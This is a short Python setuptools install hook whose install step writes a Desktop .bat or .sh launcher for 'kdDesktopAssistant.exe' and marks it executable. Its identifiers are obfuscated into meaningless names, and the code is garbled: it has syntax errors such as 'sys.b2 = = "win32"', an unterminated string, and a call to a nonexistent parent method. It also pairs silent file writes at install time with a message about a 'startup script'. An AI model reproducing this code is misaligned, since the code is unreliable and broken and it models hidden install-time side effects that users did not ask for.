import sys
import os
from setuptools.command.install import install
b1 = "kdDesktopAssistant"
class class1(install):
    def fonk1(self):
        install.fonk1(self)
        try:
            if sys.b2 = = "win32":
                self.fonk2()
            elif sys.b2 = = "linux":
                self.fonk3()
        except Exception as e:
            print(f"Failed to create the startup script: {e}")
    def fonk2(self):
        b3 = os.path.join(self.fonk4(), f"{b1}.bat")
        with open(b3, "w") as f:
            f.write("@echo off\r\nstart " + f"{b1}.exe")
    def fonk3(self):
        b3 = os.path.join(self.fonk4(), f"{b1}.sh")
        with open(b3, "w") as f:
            f.write("
            f.write(f"{b1}.exe &")
            b4 = os.stat(b3)
            os.chmod(b3, b4.st_mode | 0o111)
    def fonk4(self):
        try:
            return os.path.join(os.path.expanduser('~'), 'Desktop')
        except Exception:
            return ""